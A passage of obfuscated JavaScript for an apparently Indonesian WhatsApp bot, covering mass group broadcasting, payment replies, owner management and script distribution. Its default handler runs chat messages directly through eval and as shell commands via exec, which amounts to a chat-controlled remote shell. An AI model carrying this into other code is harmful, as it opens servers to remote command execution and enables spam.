                'image': fs.readFileSync(_0x33a678),
                'caption': _0x1aeaf2
              }, {
                'quoted': _0x1db9d5
              });
              _0x13913a += 0x1;
            } catch {}
            await sleep(global.delayJpm);
          }
          await fs.unlinkSync(_0x33a678);
          await _0x47285b.sendMessage(_0x53bf0b, {
            'text': "*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : " + _0x13913a
          }, {
            'quoted': _0x5560b2
          });
        }
        break;
      case "dana":
        {
          if (!_0x429a13) {
            return;
          }
          let _0x5a56dd = "\n*PAYMENT DANA " + global.namaOwner.toUpperCase() + "*\n\n* *Nomor :* " + global.dana + "\n\n*[ ! ] Penting :* ```Wajib kirimkan bukti transfer demi keamanan bersama```\n";
          await _0x47285b.sendMessage(_0x2f6673.chat, {
            'text': _0x5a56dd
          }, {
            'quoted': _0x5d8664
          });
        }
        break;
      case "ovo":
        {
          if (!_0x429a13) {
            return;
          }
          let _0xf3ba3a = "\n*PAYMENT OVO " + global.namaOwner.toUpperCase() + "*\n\n* *Nomor :* " + global.ovo + "\n\n*[ ! ] Penting :* ```Wajib kirimkan bukti transfer demi keamanan bersama```\n";
          await _0x47285b.sendMessage(_0x2f6673.chat, {
            'text': _0xf3ba3a
          }, {
            'quoted': _0x5d8664
          });
        }
        break;
      case "gopay":
        {
          if (!_0x429a13) {
            return;
          }
          let _0x5a5d8b = "\n*PAYMENT GOPAY " + global.namaOwner.toUpperCase() + "*\n\n* *Nomor :* " + global.gopay + "\n\n*[ ! ] Penting :* ```Wajib kirimkan bukti transfer demi keamanan bersama```\n";
          await _0x47285b.sendMessage(_0x2f6673.chat, {
            'text': _0x5a5d8b
          }, {
            'quoted': _0x5d8664
          });
        }
        break;
      case "shopepay":
        {
          if (!_0x429a13) {
            return;
          }
          let _0x1595bd = "\n*PAYMENT SHOPEPAY " + global.namaOwner.toUpperCase() + "*\n\n* *Nomor :* " + global.shopepay + "\n\n*[ ! ] Penting :* ```Wajib kirimkan bukti transfer demi keamanan bersama```\n";
          await _0x47285b.sendMessage(_0x2f6673.chat, {
            'text': _0x1595bd
          }, {
            'quoted': _0x5d8664
          });
        }
        break;
      case 'ambilq':
      case 'q':
        {
          if (!_0x2f6673.quoted) {
            return;
          }
          let _0x2861c8 = JSON.stringify(_0x2f6673.quoted, null, 0x2);
          _0x2f6673.reply(_0x2861c8);
        }
        break;
      case "toaudio":
      case "tovn":
        {
          if (!/video|mp4/.test(_0xac161)) {
            return _0x2f6673.reply("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + "dengan reply/kirim vidio" + "\n");
          }
          const _0x56d8e9 = await _0x47285b.downloadAndSaveMediaMessage(_0x13d557);
          const _0x2aab17 = await toAudio(fs.readFileSync(_0x56d8e9), "mp4");
          await _0x47285b.sendMessage(_0x2f6673.chat, {
            'audio': _0x2aab17,
            'mimetype': "audio/mpeg",
            'ptt': !!/tovn/.test(_0x4345b8)
          }, {
            'quoted': _0x2f6673
          });
          await fs.unlinkSync(_0x56d8e9);
        }
        break;
      case 'proses':
        {
          if (!_0x429a13) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': mess.owner,
              'mentions': [_0x2f6673.sender],
              'contextInfo': {
                'externalAdReply': {
                  'title': botname,
                  'body': "© Powered By " + namaOwner,
                  'thumbnailUrl': global.image.reply,
                  'sourceUrl': null
                }
              }
            }, {
              'quoted': _0x390426
            });
          }
          if (!q) {
            return _0x2f6673.reply("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + "jasa install panel" + "\n");
          }
          let _0x35beca = "📦 " + _0x1aeaf2 + "\n⏰ " + tanggal(Date.now()) + "\n\n*Testimoni :*\n" + linkSaluran + "\n\n*Marketplace :*\n" + linkGrup;
          await _0x47285b.sendMessage(_0x2f6673.chat, {
            'text': _0x35beca,
            'mentions': [_0x2f6673.sender],
            'contextInfo': {
              'externalAdReply': {
                'title': "Dana Masuk ✅",
                'body': "© Powered By " + namaOwner,
                'thumbnailUrl': global.image.reply,
                'sourceUrl': linkSaluran
              }
            }
          }, {
            'quoted': _0x5560b2
          });
        }
        break;
      case "done":
        {
          if (!_0x429a13) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': mess.owner,
              'mentions': [_0x2f6673.sender],
              'contextInfo': {
                'externalAdReply': {
                  'title': botname,
                  'body': "© Powered By " + namaOwner,
                  'thumbnailUrl': global.image.reply,
                  'sourceUrl': null
                }
              }
            }, {
              'quoted': _0x390426
            });
          }
          if (!q) {
            return _0x2f6673.reply("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + "jasa install panel" + "\n");
          }
          let _0x74e794 = "📦 " + _0x1aeaf2 + "\n⏰ " + tanggal(Date.now()) + "\n\n*Testimoni :*\n" + linksaluran + "\n\n*Marketplace :*\n" + linkGrup;
          await _0x47285b.sendMessage(_0x2f6673.chat, {
            'text': _0x74e794,
            'mentions': [_0x2f6673.sender],
            'contextInfo': {
              'externalAdReply': {
                'title': "Transaksi Done ✅",
                'body': "© Powered By " + namaOwner,
                'thumbnailUrl': global.image.reply,
                'sourceUrl': linkSaluran
              }
            }
          }, {
            'quoted': _0x5560b2
          });
        }
        break;
      case "save":
      case 'sv':
        {
          if (!_0x429a13) {
            return;
          }
          await _0x47285b.sendContact(_0x2f6673.chat, [_0x2f6673.chat.split('@')[0x0]], _0x2f6673);
        }
        break;
      case 'self':
        {
          if (!_0x429a13) {
            return;
          }
          _0x47285b["public"] = false;
          _0x47285b.sendMessage(_0x2f6673.chat, {
            'text': "Berhasil mengganti ke mode *self*",
            'contextInfo': {
              'mentionedJid': [_0x2f6673.sender],
              'externalAdReply': {
                'showAdAttribution': true,
                'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                'body': 'VynxOfficial',
                'previewType': "PHOTO"
              }
            }
          }, {
            'quoted': _0x5560b2
          });
        }
        break;
      case 'getcase':
        {
          if (!_0x429a13) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': mess.owner,
              'mentions': [_0x2f6673.sender],
              'contextInfo': {
                'externalAdReply': {
                  'title': botname,
                  'body': "© Powered By " + namaOwner,
                  'thumbnailUrl': global.image.reply,
                  'sourceUrl': null
                }
              }
            }, {
              'quoted': _0x390426
            });
          }
          if (!_0x1aeaf2) {
            return _0x2f6673.reply("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + "menu" + "\n");
          }
          const _0x89ef81 = _0xf363d2 => {
            const _0x49b1df = fs.readFileSync("./depay.js").toString();
            const _0x11b252 = new RegExp("case ['\"]" + _0xf363d2 + "['\"]", 'i');
            const _0x3a0fce = _0x49b1df.split(_0x11b252);
            if (_0x3a0fce.length < 0x2) {
              throw new Error("Case not found");
            }
            return "case " + ("'" + _0xf363d2 + "'") + _0x3a0fce[0x1].split("break")[0x0] + "break";
          };
          try {
            reply('' + _0x89ef81(q));
          } catch (_0x5003da) {
            return _0x2f6673.reply("Case *" + _0x1aeaf2 + "* Tidak Ditemukan");
          }
        }
        break;
      case "ping":
      case 'uptime':
        {
          let _0x558d13 = speed();
          let _0x8c5fcd = speed() - _0x558d13;
          var _0x32718e = await nou.drive.info();
          let _0x2fab61 = "\n*INFORMATION SERVER*\n\n*• Platform :* " + nou.os.type() + "\n*• Total Ram :* " + formatp(os.totalmem()) + "\n*• Total Disk :* " + _0x32718e.totalGb + " GB\n*• Total Cpu :* " + os.cpus().length + " Core\n*• Runtime Vps :* " + runtime(os.uptime()) + "\n*• Respon Speed :* " + _0x8c5fcd.toFixed(0x4) + " detik\n*• Runtime Bot :* " + runtime(process.uptime()) + "\n";
          await _0x47285b.sendMessage(_0x2f6673.chat, {
            'text': '' + _0x2fab61,
            'contextInfo': {
              'mentionedJid': [_0x2f6673.sender],
              'externalAdReply': {
                'showAdAttribution': true,
                'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                'body': 'VynxOfficial',
                'previewType': "PHOTO"
              }
            }
          }, {
            'quoted': _0x5560b2
          });
        }
        break;
      case "public":
        {
          if (!_0x429a13) {
            return;
          }
          _0x47285b["public"] = true;
          _0x47285b.sendMessage(_0x2f6673.chat, {
            'text': "Berhasil mengganti ke mode *public*",
            'contextInfo': {
              'mentionedJid': [_0x2f6673.sender],
              'externalAdReply': {
                'showAdAttribution': true,
                'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                'body': 'VynxOfficial',
                'previewType': "PHOTO"
              }
            }
          }, {
            'quoted': _0x5560b2
          });
        }
        break;
      case "restart":
      case "rst":
        {
          if (!_0x429a13) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': mess.owner,
              'mentions': [_0x2f6673.sender],
              'contextInfo': {
                'externalAdReply': {
                  'title': botname,
                  'body': "© Powered By " + namaOwner,
                  'thumbnailUrl': global.image.reply,
                  'sourceUrl': null
                }
              }
            }, {
              'quoted': _0x390426
            });
          }
          await _0x2f6673.reply("Memproses _restart server_ . . .");
          var _0x3212bf = await fs.readdirSync("./session");
          var _0x33a32c = await _0x3212bf.filter(_0xc4b831 => _0xc4b831 !== "creds.json");
          for (let _0x5e8631 of _0x33a32c) {
            await fs.unlinkSync("./session/" + _0x5e8631);
          }
          await process.send("reset");
        }
        break;
      case 'upchannel':
      case "upch":
        {
          if (!_0x429a13) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': mess.owner,
              'mentions': [_0x2f6673.sender],
              'contextInfo': {
                'externalAdReply': {
                  'title': botname,
                  'body': "© Powered By " + namaOwner,
                  'thumbnailUrl': global.image.reply,
                  'sourceUrl': null
                }
              }
            }, {
              'quoted': _0x390426
            });
          }
          if (!_0x1aeaf2) {
            return _0x2f6673.reply("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + "teksnya" + "\n");
          }
          await _0x47285b.sendMessage(idSaluran, {
            'text': _0x1aeaf2
          });
          _0x47285b.sendMessage(_0x2f6673.chat, {
            'text': "Berhasil mengirim pesan *teks* ke dalam channel whatsapp",
            'contextInfo': {
              'mentionedJid': [_0x2f6673.sender],
              'externalAdReply': {
                'showAdAttribution': true,
                'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                'body': 'VynxOfficial',
                'previewType': "PHOTO"
              }
            }
          }, {
            'quoted': _0x5560b2
          });
        }
        break;
      case 'upchannel2':
      case "upch2":
        {
          if (!_0x429a13) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + mess.owner,
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          if (!_0x1aeaf2) {
            return _0x2f6673.reply("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + "teksnya dengan mengirim foto" + "\n");
          }
          if (!/image/.test(_0xac161)) {
            return _0x2f6673.reply("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + "teksnya dengan mengirim foto" + "\n");
          }
          let _0x1cb63a = await _0x47285b.downloadAndSaveMediaMessage(_0x13d557);
          await _0x47285b.sendMessage(idSaluran, {
            'image': await fs.readFileSync(_0x1cb63a),
            'caption': _0x1aeaf2
          });
          _0x47285b.sendMessage(_0x2f6673.chat, {
            'text': "Berhasil mengirim pesan *teks & foto* ke dalam channel whatsapp",
            'contextInfo': {
              'mentionedJid': [_0x2f6673.sender],
              'externalAdReply': {
                'showAdAttribution': true,
                'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                'body': 'VynxOfficial',
                'previewType': "PHOTO"
              }
            }
          }, {
            'quoted': _0x5560b2
          });
          await fs.unlinkSync(_0x1cb63a);
        }
        break;
      case "getsc":
        {
          if (_0x2f6673.sender.split('@')[0x0] !== global.owner && _0x2f6673.sender !== _0x3a968e) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + mess.owner,
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          let _0x3c5727 = await fs.readdirSync("./library/database/sampah");
          if (_0x3c5727.length >= 0x2) {
            let _0x4e2bc4 = _0x3c5727.filter(_0x5a653f => _0x5a653f !== 'A');
            for (let _0x420405 of _0x4e2bc4) {
              await fs.unlinkSync("./library/database/sampah/" + _0x420405);
            }
          }
          await _0x2f6673.reply("Wait.....");
          await _0x47285b.sendMessage(_0x2f6673.sender, {
            'document': await fs.readFileSync("./𝗦𝘂𝗽𝗲𝗿𝗦𝗼𝗻𝗶𝗰 𝗩𝟯 By Vynx.zip"),
            'fileName': "𝗦𝘂𝗽𝗲𝗿𝗦𝗼𝗻𝗶𝗰 𝗩𝟯 By Vynx.zip",
            'mimetype': "application/zip"
          }, {
            'quoted': _0x2f6673
          });
          await execSync("rm -rf 𝗦𝘂𝗽𝗲𝗿𝗦𝗼𝗻𝗶𝗰 𝗩𝟯 By Vynx.zip");
          if (_0x2f6673.chat !== _0x2f6673.sender) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': "Script bot berhasil dikirim ke private chat",
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
        }
        break;
      case 'resetdb':
      case 'rstdb':
        {
          if (!_0x429a13) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + mess.owner,
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          for (let _0xb27ae8 of Object.keys(global.db)) {
            global.db[_0xb27ae8] = {};
          }
          _0x47285b.sendMessage(_0x2f6673.chat, {
            'text': "Berhasil mereset database ✅",
            'contextInfo': {
              'mentionedJid': [_0x2f6673.sender],
              'externalAdReply': {
                'showAdAttribution': true,
                'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                'body': 'VynxOfficial',
                'previewType': "PHOTO"
              }
            }
          }, {
            'quoted': _0x5560b2
          });
        }
        break;
      case "setppbot":
        {
          if (!_0x429a13) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + mess.owner,
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          if (/image/g.test(_0xac161)) {
            var _0x4bc4a2 = await _0x47285b.downloadAndSaveMediaMessage(_0x13d557);
            if (_0x3e49e9[0x0] && _0x3e49e9[0x0] == 'panjang') {
              const {
                img: _0x59cfd6
              } = await generateProfilePicture(_0x4bc4a2);
              await _0x47285b.query({
                'tag': 'iq',
                'attrs': {
                  'to': _0x3a968e,
                  'type': "set",
                  'xmlns': "w:profile:picture"
                },
                'content': [{
                  'tag': "picture",
                  'attrs': {
                    'type': "image"
                  },
                  'content': _0x59cfd6
                }]
              });
              await fs.unlinkSync(_0x4bc4a2);
              _0x47285b.sendMessage(_0x2f6673.chat, {
                'text': "Berhasil mengganti foto profil bot ✅",
                'contextInfo': {
                  'mentionedJid': [_0x2f6673.sender],
                  'externalAdReply': {
                    'showAdAttribution': true,
                    'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                    'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                    'body': 'VynxOfficial',
                    'previewType': "PHOTO"
                  }
                }
              }, {
                'quoted': _0x5560b2
              });
            } else {
              await _0x47285b.updateProfilePicture(_0x3a968e, {
                'content': _0x4bc4a2
              });
              await fs.unlinkSync(_0x4bc4a2);
              _0x47285b.sendMessage(_0x2f6673.chat, {
                'text': "Berhasil mengganti foto profil bot ✅",
                'contextInfo': {
                  'mentionedJid': [_0x2f6673.sender],
                  'externalAdReply': {
                    'showAdAttribution': true,
                    'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                    'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                    'body': 'VynxOfficial',
                    'previewType': "PHOTO"
                  }
                }
              }, {
                'quoted': _0x5560b2
              });
            }
          } else {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + ("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + "dengan mengirim foto" + "\n"),
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
        }
        break;
      case "clearchat":
      case "clc":
        {
          if (!_0x429a13) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + mess.owner,
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          _0x47285b.chatModify({
            'delete': true,
            'lastMessages': [{
              'key': _0x2f6673.key,
              'messageTimestamp': _0x2f6673.timestamp
            }]
          }, _0x2f6673.chat);
        }
        break;
      case 'listowner':
      case 'listown':
        {
          if (owners.length < 0x1) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': "Tidak ada owner tambahan",
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          let _0x20dac4 = "\n *List all owner tambahan*\n";
          for (let _0x1009f4 of owners) {
            _0x20dac4 += "\n* " + _0x1009f4.split('@')[0x0] + "\n* *Tag :* @" + _0x1009f4.split('@')[0x0] + "\n";
          }
          _0x47285b.sendMessage(_0x2f6673.chat, {
            'text': _0x20dac4,
            'mentions': owners
          }, {
            'quoted': _0x5560b2
          });
        }
        break;
      case "delpemilik":
      case 'delown':
        {
          if (!_0x429a13) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + mess.owner,
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          if (!_0x2f6673.quoted && !_0x1aeaf2) {
            return _0x2f6673.reply("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + '6285###' + "\n");
          }
          const _0x36bbed = _0x2f6673.quoted ? _0x2f6673.quoted.sender : _0x1aeaf2.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
          const _0x4e1ce9 = _0x36bbed.split('@')[0x0];
          if (_0x4e1ce9 === global.owner || _0x36bbed == _0x3a968e) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': "Tidak bisa menghapus owner utama!",
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          if (!owners.includes(_0x36bbed)) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + ("Nomor " + _0x4e1ce9 + " bukan owner bot!"),
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          let _0x1c4f29 = owners.indexOf(_0x36bbed);
          await owners.splice(_0x1c4f29, 0x1);
          await fs.writeFileSync("./library/database/owner.json", JSON.stringify(owners, null, 0x2));
          _0x47285b.sendMessage(_0x2f6673.chat, {
            'text': "Berhasil menghapus owner ✅",
            'contextInfo': {
              'mentionedJid': [_0x2f6673.sender],
              'externalAdReply': {
                'showAdAttribution': true,
                'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                'body': 'VynxOfficial',
                'previewType': "PHOTO"
              }
            }
          }, {
            'quoted': _0x5560b2
          });
        }
        break;
      case "addpemilik":
      case "addpem":
        {
          if (!_0x429a13) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + mess.owner,
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          if (!_0x2f6673.quoted && !_0x1aeaf2) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + ("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + "6285###" + "\n"),
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          const _0x19cbeb = _0x2f6673.quoted ? _0x2f6673.quoted.sender : _0x1aeaf2.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          const _0x6bb10e = _0x19cbeb.split('@')[0x0];
          if (_0x6bb10e === global.owner || owners.includes(_0x19cbeb) || _0x19cbeb === _0x3a968e) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + ("Nomor " + _0x6bb10e + " sudah menjadi owner bot!"),
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          owners.push(_0x19cbeb);
          await fs.writeFileSync("./library/database/owner.json", JSON.stringify(owners, null, 0x2));
          _0x47285b.sendMessage(_0x2f6673.chat, {
            'text': "Berhasil menambah owner ✅",
            'contextInfo': {
              'mentionedJid': [_0x2f6673.sender],
              'externalAdReply': {
                'showAdAttribution': true,
                'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                'body': 'VynxOfficial',
                'previewType': "PHOTO"
              }
            }
          }, {
            'quoted': _0x5560b2
          });
        }
        break;
      default:
        if (_0x5291cc.startsWith('>')) {
          if (!_0x429a13) {
            return;
          }
          try {
            let _0xcba4a6 = await eval(_0x5291cc.slice(0x2));
            if (typeof _0xcba4a6 !== "string") {
              _0xcba4a6 = require('util').inspect(_0xcba4a6);
            }
            await _0x2f6673.reply(_0xcba4a6);
          } catch (_0x1bf925) {
            await _0x2f6673.reply(String(_0x1bf925));
          }
        }
        if (_0x2f6673.text.toLowerCase() == "bot") {
          _0x47285b.sendMessage(_0x2f6673.chat, {
            'text': "Oi Ape Bos",
            'contextInfo': {
              'mentionedJid': [_0x2f6673.sender],
              'externalAdReply': {
                'showAdAttribution': true,
                'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                'body': 'VynxOfficial',
                'previewType': "PHOTO"
              }
            }
          }, {
            'quoted': _0x5560b2
          });
        }
        if (_0x2f6673.text.toLowerCase() == "woi bot") {
          _0x47285b.sendMessage(_0x2f6673.chat, {
            'text': "napa? ",
            'contextInfo': {
              'mentionedJid': [_0x2f6673.sender],
              'externalAdReply': {
                'showAdAttribution': true,
                'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                'body': 'VynxOfficial',
                'previewType': "PHOTO"
              }
            }
          }, {
            'quoted': _0x5560b2
          });
        }
        if (_0x2f6673.text.toLowerCase() == 'p') {
          _0x47285b.sendMessage(_0x2f6673.chat, {
            'text': "Punya adap ga bego? orang mah salam.",
            'contextInfo': {
              'mentionedJid': [_0x2f6673.sender],
              'externalAdReply': {
                'showAdAttribution': true,
                'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                'body': 'VynxOfficial',
                'previewType': "PHOTO"
              }
            }
          }, {
            'quoted': _0x5560b2
          });
        }
        if (_0x2f6673.text.toLowerCase() == "sayang") {
          _0x47285b.sendMessage(_0x2f6673.chat, {
            'text': "Iya ayy >< ",
            'contextInfo': {
              'mentionedJid': [_0x2f6673.sender],
              'externalAdReply': {
                'showAdAttribution': true,
                'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                'body': 'VynxOfficial',
                'previewType': "PHOTO"
              }
            }
          }, {
            'quoted': _0x5560b2
          });
        }
        if (_0x2f6673.text.toLowerCase() == "yang") {
          _0x2f6673.reply("iyaa ayy >< ");
        }
        if (_0x5291cc.startsWith('=>')) {
          if (!_0x429a13) {
            return;
          }
          try {
            let _0x4f2e38 = await eval("(async () => { " + _0x5291cc.slice(0x2) + " })()");
            if (typeof _0x4f2e38 !== "string") {
              _0x4f2e38 = require('util').inspect(_0x4f2e38);
            }
            await _0x2f6673.reply(_0x4f2e38);
          } catch (_0x2857e9) {
            await _0x2f6673.reply(String(_0x2857e9));
          }
        }
        if (_0x5291cc.startsWith('$')) {
          if (!_0x429a13) {
            return;
          }
          if (!_0x1aeaf2) {
            return;
          }
          exec(_0x5291cc.slice(0x2), (_0x4480c1, _0x4c2b4a) => {
            if (_0x4480c1) {
              return _0x2f6673.reply('' + _0x4480c1);
            }
            if (_0x4c2b4a) {
